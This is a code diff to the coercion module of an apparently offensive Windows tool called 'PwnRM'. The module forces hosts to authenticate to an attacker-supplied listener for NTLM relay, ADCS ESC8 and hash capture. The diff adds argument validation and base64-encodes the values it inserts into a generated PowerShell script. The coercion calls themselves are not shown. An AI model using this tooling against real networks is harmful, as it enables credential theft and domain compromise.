@@ -7,7 +7,7 @@ Critical for ADCS ESC8 relay, NTLM relaying, and NetNTLM hash capturing.
 from typing import List, Any
 from . import BaseModule
 from ..shell.ui import c, R, G, Y, B, M, C, DIM, BLD, RST
-from ..shell.commands import b64str
+from ..shell.commands import b64str, str_b64
 
 
 class CoerceModule(BaseModule):
@@ -23,7 +23,7 @@ class CoerceModule(BaseModule):
     def run(self, shell, args: List[str]) -> Any:
         listener = ""
         method = "webdav"
-        port = "80"
+        port = 80
 
         for i, a in enumerate(args):
             if a in ("-l", "--listener") and i + 1 < len(args):
@@ -31,11 +31,24 @@ class CoerceModule(BaseModule):
             elif a in ("-m", "--method") and i + 1 < len(args):
                 method = args[i + 1].lower()
             elif a in ("-p", "--port") and i + 1 < len(args):
-                port = args[i + 1]
+                try:
+                    port = int(args[i + 1])
+                except ValueError:
+                    shell.write_error("  [-] Invalid listener port. Expected an integer from 1 to 65535.")
+                    return {"status": "error", "error": "Invalid --port"}
 
         if not listener:
             shell.write_warning("Usage: !coerce --listener <IP/Host> [--method webdav|spooler|efs|dfs|all] [--port 80]")
             return {"status": "error", "error": "Missing --listener"}
+        if method not in {"webdav", "spooler", "efs", "dfs", "all"}:
+            shell.write_error("  [-] Invalid coercion method. Choose webdav, spooler, efs, dfs, or all.")
+            return {"status": "error", "error": "Invalid --method"}
+        if not 1 <= port <= 65535:
+            shell.write_error("  [-] Invalid listener port. Expected an integer from 1 to 65535.")
+            return {"status": "error", "error": "Invalid --port"}
+
+        listener_expr = str_b64(listener)
+        method_expr = str_b64(method)
 
         shell.write_info(c(M + BLD, f"  [*] PwnRM Coerce Engine — triggering {method.upper()} authentication coercion to {listener}:{port}..."))
 
@@ -45,9 +58,9 @@ Write-Host "`n========================================================" -Foregro
 Write-Host "   PwnRM Coerced Authentication Engine (2026+ TTPs)" -ForegroundColor Cyan
 Write-Host "========================================================`n" -ForegroundColor Cyan
 
-$listener = '{listener}'
-$method = '{method}'
-$port = '{port}'
+$listener = {listener_expr}
+$method = {method_expr}
+$port = {port}
 
 Write-Host "  [*] Target Listener: $listener (Port: $port)" -ForegroundColor White
 Write-Host "  [*] Chosen Method  : $method" -ForegroundColor White
